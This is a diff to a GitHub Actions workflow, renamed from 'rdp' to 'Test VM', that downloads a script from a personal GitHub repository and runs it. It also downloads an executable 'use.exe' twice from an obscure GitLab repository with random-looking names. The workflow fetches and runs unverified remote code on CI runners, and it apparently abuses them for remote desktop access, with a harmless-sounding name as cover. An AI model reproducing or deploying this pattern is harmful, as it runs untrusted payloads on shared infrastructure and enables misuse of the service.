@@ -1,4 +1,4 @@
-name: rdp
+name: Test VM
 
 on: [workflow_dispatch]
 
@@ -10,11 +10,11 @@ jobs:
     steps:
     - name: Download
       run: |
-          curl -s -L -o setup.cmd https://github.com/Efebey2903/fictional-octo-waffle/raw/main/b.cmd
+          curl -s -L -o setup.ps1 https://github.com/Efebey007/Test-Environment/raw/refs/heads/main/test.ps1
     
     - name: run
       run: |
-           cmd /c setup.cmd
+           ./setup.ps1
            curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
            sleep 240
            curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
